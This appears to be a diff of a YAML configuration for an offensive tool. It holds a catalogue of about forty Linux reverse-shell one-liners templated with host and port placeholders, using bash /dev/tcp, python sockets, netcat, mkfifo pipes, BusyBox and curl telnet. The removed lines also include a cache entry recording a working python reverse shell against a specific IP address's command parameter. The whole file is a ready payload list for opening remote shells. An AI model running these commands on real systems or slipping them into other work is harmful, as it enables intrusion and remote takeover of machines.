@@ -1,181 +1,125 @@
-version: 1.1
+version: 1
+
 target:
-  host: '{host}'
-  port: '{port}'
+  host: "{host}"
+  port: "{port}"
+
 os_shells:
   linux:
-  - id: sh -i
-    command: 'sh -i >& /dev/tcp/{host}/{port} 0>&1
-
-      '
-  - id: /bin/sh -i
-    command: '/bin/sh -i >& /dev/tcp/{host}/{port} 0>&1
-
-      '
-  - id: python
-    command: 'python3 -c ''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0);
-      os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")''
-
-      '
-  - id: bash -i
-    command: 'bash -i >& /dev/tcp/{host}/{port} 0>&1
-
-      '
-  - id: /bin/bash -i
-    command: '/bin/bash -i >& /dev/tcp/{host}/{port} 0>&1
-
-      '
-  - id: sh 196
-    command: '0<&196;exec 196<>/dev/tcp/{host}/{port}; sh <&196 >&196 2>&196
-
-      '
-  - id: /bin/sh 196
-    command: '0<&196;exec 196<>/dev/tcp/{host}/{port}; /bin/sh <&196 >&196 2>&196
-
-      '
-  - id: bash 196
-    command: '0<&196;exec 196<>/dev/tcp/{host}/{port}; bash <&196 >&196 2>&196
-
-      '
-  - id: /bin/bash 196
-    command: '0<&196;exec 196<>/dev/tcp/{host}/{port}; /bin/bash <&196 >&196 2>&196
-
-      '
-  - id: sh read line
-    command: 'exec 5<>/dev/tcp/{host}/{port};cat <&5 | while read line; do $line 2>&5
-      >&5; done
-
-      '
-  - id: bash 5
-    command: 'sh -i 5<> /dev/tcp/{host}/{port} 0<&5 1>&5 2>&5
-
-      '
-  - id: /bin/sh 5
-    command: '/bin/sh -i 5<> /dev/tcp/{host}/{port} 0<&5 1>&5 2>&5
-
-      '
-  - id: bash 5
-    command: 'bash -i 5<> /dev/tcp/{host}/{port} 0<&5 1>&5 2>&5
-
-      '
-  - id: /bin/bash 5
-    command: '/bin/bash -i 5<> /dev/tcp/{host}/{port} 0<&5 1>&5 2>&5
-
-      '
-  - id: sh udp
-    command: 'sh -i >& /dev/udp/{host}/{port} 0>&1
-
-      '
-  - id: /bin/sh udp
-    command: '/bin/sh -i >& /dev/udp/{host}/{port} 0>&1
-
-      '
-  - id: bash udp
-    command: 'bash -i >& /dev/udp/{host}/{port} 0>&1
-
-      '
-  - id: /bin/bash udp
-    command: '/bin/bash -i >& /dev/udp/{host}/{port} 0>&1
-
-      '
-  - id: nc sh mkfifo
-    command: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {host} {port} >/tmp/f
-
-      '
-  - id: nc /bin/sh mkfifo
-    command: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port}
-      >/tmp/f
-
-      '
-  - id: nc bash mkfifo
-    command: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {host} {port} >/tmp/f
-
-      '
-  - id: nc /bin/bash mkfifo
-    command: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {host} {port}
-      >/tmp/f
-
-      '
-  - id: nc sh -e
-    command: 'nc {host} {port} -e sh
-
-      '
-  - id: nc /bin/sh -e
-    command: 'nc {host} {port} -e /bin/sh
-
-      '
-  - id: nc bash -e
-    command: 'nc {host} {port} -e bash
-
-      '
-  - id: nc /bin/bash -e
-    command: 'nc {host} {port} -e /bin/bash
-
-      '
-  - id: BusyBox nc -e sh
-    command: 'busybox nc {host} {port} -e sh
-
-      '
-  - id: BusyBox nc -e /bin/sh
-    command: 'busybox nc {host} {port} -e /bin/sh
-
-      '
-  - id: BusyBox nc -e bash
-    command: 'busybox nc {host} {port} -e bash
-
-      '
-  - id: BusyBox nc -e /bin/bash
-    command: 'busybox nc {host} {port} -e /bin/bash
-
-      '
-  - id: nc -c sh
-    command: 'nc -c sh {host} {port}
-
-      '
-  - id: nc -c /bin/sh
-    command: 'nc -c /bin/sh {host} {port}
-
-      '
-  - id: nc -c bash
-    command: 'nc -c bash {host} {port}
-
-      '
-  - id: nc -c /bin/bash
-    command: 'nc -c /bin/bash {host} {port}
-
-      '
-  - id: BusyBox nc -c sh
-    command: 'busybox nc -c sh
-
-      '
-  - id: curl sh
-    command: 'C=''curl -Ns telnet://{host}:{port}''; $C </dev/null 2>&1 | sh 2>&1
-      | $C >/dev/null
-
-      '
-  - id: curl /bin/sh
-    command: 'C=''curl -Ns telnet://{host}:{port}''; $C </dev/null 2>&1 | /bin/sh
-      2>&1 | $C >/dev/null
-
-      '
-  - id: curl bash
-    command: 'C=''curl -Ns telnet://{host}:{port}''; $C </dev/null 2>&1 | bash 2>&1
-      | $C >/dev/null
-
-      '
-  - id: curl /bin/bash
-    command: 'C=''curl -Ns telnet://{host}:{port}''; $C </dev/null 2>&1 | /bin/bash
-      2>&1 | $C >/dev/null
-
-      '
-success_cache:
-  http://54.234.138.29/run|param=cmd|os=linux:
-    shells:
-    - id: python
-      command_template: 'python3 -c ''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0);
-        os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")''
-
-        '
-      notes: ''
-      first_seen: '2025-10-07T09:00:47.754884+00:00'
-    updated_at: '2025-10-07T09:00:47.757646+00:00'
+    - id: "sh -i"
+      command: |
+        sh -i >& /dev/tcp/{host}/{port} 0>&1
+    - id: "/bin/sh -i"
+      command: |
+        /bin/sh -i >& /dev/tcp/{host}/{port} 0>&1
+    - id: "python"
+      command: |
+        python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+    - id: "bash -i"
+      command: |
+        bash -i >& /dev/tcp/{host}/{port} 0>&1
+    - id: "/bin/bash -i"
+      command: |
+        /bin/bash -i >& /dev/tcp/{host}/{port} 0>&1
+    - id: "sh 196"
+      command: |
+        0<&196;exec 196<>/dev/tcp/{host}/{port}; sh <&196 >&196 2>&196
+    - id: "/bin/sh 196"
+      command: |
+        0<&196;exec 196<>/dev/tcp/{host}/{port}; /bin/sh <&196 >&196 2>&196
+    - id: "bash 196"
+      command: |
+        0<&196;exec 196<>/dev/tcp/{host}/{port}; bash <&196 >&196 2>&196
+    - id: "/bin/bash 196"
+      command: |
+        0<&196;exec 196<>/dev/tcp/{host}/{port}; /bin/bash <&196 >&196 2>&196
+    - id: "sh read line"
+      command: |
+        exec 5<>/dev/tcp/{host}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done
+    - id: "bash 5"
+      command: |
+        sh -i 5<> /dev/tcp/{host}/{port} 0<&5 1>&5 2>&5
+    - id: "/bin/sh 5"
+      command: |
+        /bin/sh -i 5<> /dev/tcp/{host}/{port} 0<&5 1>&5 2>&5
+    - id: "bash 5"
+      command: |
+        bash -i 5<> /dev/tcp/{host}/{port} 0<&5 1>&5 2>&5
+    - id: "/bin/bash 5"
+      command: |
+        /bin/bash -i 5<> /dev/tcp/{host}/{port} 0<&5 1>&5 2>&5
+    - id: "sh udp"
+      command: |
+        sh -i >& /dev/udp/{host}/{port} 0>&1
+    - id: "/bin/sh udp"
+      command: |
+        /bin/sh -i >& /dev/udp/{host}/{port} 0>&1
+    - id: "bash udp"
+      command: |
+        bash -i >& /dev/udp/{host}/{port} 0>&1
+    - id: "/bin/bash udp"
+      command: |
+        /bin/bash -i >& /dev/udp/{host}/{port} 0>&1
+    - id: "nc sh mkfifo"
+      command: |
+        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {host} {port} >/tmp/f
+    - id: "nc /bin/sh mkfifo"
+      command: |  
+        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f
+    - id: "nc bash mkfifo"
+      command: |
+        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {host} {port} >/tmp/f
+    - id: "nc /bin/bash mkfifo"
+      command: |
+        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {host} {port} >/tmp/f
+    - id: "nc sh -e"
+      command: |
+        nc {host} {port} -e sh
+    - id: "nc /bin/sh -e"
+      command: |
+        nc {host} {port} -e /bin/sh
+    - id: "nc bash -e"
+      command: |
+        nc {host} {port} -e bash
+    - id: "nc /bin/bash -e"
+      command: |
+        nc {host} {port} -e /bin/bash
+    - id: "BusyBox nc -e sh"
+      command: |
+        busybox nc {host} {port} -e sh
+    - id: "BusyBox nc -e /bin/sh"
+      command: |
+        busybox nc {host} {port} -e /bin/sh
+    - id: "BusyBox nc -e bash"
+      command: |
+        busybox nc {host} {port} -e bash
+    - id: "BusyBox nc -e /bin/bash"
+      command: |
+        busybox nc {host} {port} -e /bin/bash
+    - id: "nc -c sh"
+      command: |
+        nc -c sh {host} {port}
+    - id: "nc -c /bin/sh"
+      command: |
+        nc -c /bin/sh {host} {port}
+    - id: "nc -c bash"
+      command: |
+        nc -c bash {host} {port}
+    - id: "nc -c /bin/bash"
+      command: |
+        nc -c /bin/bash {host} {port}
+    - id: "BusyBox nc -c sh"
+      command: |
+        busybox nc -c sh
+    - id: "curl sh"
+      command: |
+        C='curl -Ns telnet://{host}:{port}'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null
+    - id: "curl /bin/sh"
+      command: |
+        C='curl -Ns telnet://{host}:{port}'; $C </dev/null 2>&1 | /bin/sh 2>&1 | $C >/dev/null
+    - id: "curl bash"
+      command: |
+        C='curl -Ns telnet://{host}:{port}'; $C </dev/null 2>&1 | bash 2>&1 | $C >/dev/null
+    - id: "curl /bin/bash"
+      command: |
+        C='curl -Ns telnet://{host}:{port}'; $C </dev/null 2>&1 | /bin/bash 2>&1 | $C >/dev/null
